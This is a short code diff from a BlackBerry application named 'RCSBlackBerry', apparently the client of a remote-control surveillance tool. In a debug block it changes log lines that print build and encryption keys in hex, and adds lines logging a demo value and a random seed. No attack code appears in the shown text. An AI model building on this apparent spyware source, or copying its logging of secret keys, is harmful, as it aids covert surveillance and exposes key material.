@@ -95,10 +95,12 @@ public class Main extends UiApplication {
         debug = new Debug("Main", DebugLevel.VERBOSE);
         debug.info("RCSBlackBerry " + Version.VERSION);
         debug.info("Message encryption: " + Messages.getString("1.0"));
-        debug.info("BuildID " + new String(Keys.getInstance().getBuildID()));
-        debug.info("Key Conf " + Utils.byteArrayToHex(Keys.getInstance().getConfKey()));
-        debug.info("Key Log " + Utils.byteArrayToHex(Keys.getInstance().getLogKey()));
-        debug.info("Key Proto" + Utils.byteArrayToHex(Keys.getInstance().getProtoKey()));
+        debug.info("BuildID = " + new String(Keys.getInstance().getBuildID()));
+        debug.info("Key Conf = " + Utils.byteArrayToHex(Keys.getInstance().getConfKey()));
+        debug.info("Key Log = " + Utils.byteArrayToHex(Keys.getInstance().getLogKey()));
+        debug.info("Key Proto = " + Utils.byteArrayToHex(Keys.getInstance().getProtoKey()));
+        debug.info("Demo = " + Utils.byteArrayToHex(Keys.getInstance().getDemo()));
+        debug.info("Random = " + Utils.byteArrayToHex(Keys.getInstance().getRandomSeed()));
         //#endif
 
         final Thread coreThread = new Thread(core);
